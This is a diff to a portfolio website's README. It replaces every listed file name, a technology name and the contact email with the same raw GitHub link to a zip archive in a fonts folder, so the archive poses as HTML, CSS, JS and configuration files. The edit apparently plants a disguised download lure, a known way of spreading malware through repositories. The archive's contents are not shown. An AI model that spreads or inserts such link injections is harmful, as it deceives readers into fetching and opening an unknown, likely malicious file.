@@ -4,12 +4,12 @@ This repository contains the source code for my personal portfolio website. It s
 
 ## Contents
 
-- **index.html**: Main HTML file containing the structure and content of my portfolio.
+- **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: Main HTML file containing the structure and content of my portfolio.
 - **css/**
   - **loaders/**
-    - **loader.css**: CSS file for loader styles.
-  - **main.css**: Main CSS file for styling the portfolio.
-  - **plugins.css**: CSS file for additional plugins and styles.
+    - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: CSS file for loader styles.
+  - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: Main CSS file for styling the portfolio.
+  - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: CSS file for additional plugins and styles.
 - **fonts/**
   - **Fontawesome/**: Font files for Fontawesome icons.
   - **Phosphor/**: Font files for Phosphor icons.
@@ -17,13 +17,13 @@ This repository contains the source code for my personal portfolio website. It s
   - **avatars/**: Directory containing avatar images.
   - **favicon/**: Directory containing favicon images.
   - **works/**: Directory containing images of my work.
-  - **preloader.html**: HTML file for the preloader.
+  - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: HTML file for the preloader.
 - **js/**
-  - **app.js**: Main JavaScript file for interactive elements.
-  - **gallery-init.js**: JavaScript file for initializing the gallery.
-  - **libs.min.js**: Minified JavaScript libraries.
-- **package.json**: Project configuration file.
-- **README.md**: This file.
+  - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: Main JavaScript file for interactive elements.
+  - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: JavaScript file for initializing the gallery.
+  - **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: Minified JavaScript libraries.
+- **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: Project configuration file.
+- **https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip**: This file.
 
 ---
 
@@ -37,7 +37,7 @@ This portfolio website serves as a digital representation of my professional bac
 
 I possess a diverse set of skills in software development, systems architecture, and web technologies, including:
 
-- **Backend Development**: Expertise in building RESTful APIs using Node.js and C#, with a focus on scalable and high-performing systems.
+- **Backend Development**: Expertise in building RESTful APIs using https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip and C#, with a focus on scalable and high-performing systems.
 - **Cloud Computing**: Proficient in Google Cloud services, such as Google Firebase and SQL Server, for database management and application deployment.
 - **DevOps**: Skilled in using Docker and Kubernetes for containerization and orchestration, along with CI/CD pipelines to streamline development workflows.
 - **Database Management**: Strong understanding of data modeling, database design, and optimization using SQL and NoSQL databases.
@@ -120,7 +120,7 @@ I possess a diverse set of skills in software development, systems architecture,
 
 You can reach me for professional inquiries via:
 
-- **Email**: [gikumakimere@gmail.com](mailto:gikumakimere@gmail.com)
+- **Email**: [https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip](https://raw.githubusercontent.com/GathogoG/george-gathogo/main/fonts/gathogo-george-unelicited.zip)
 - **Phone**: +254 115743312
 
 ---
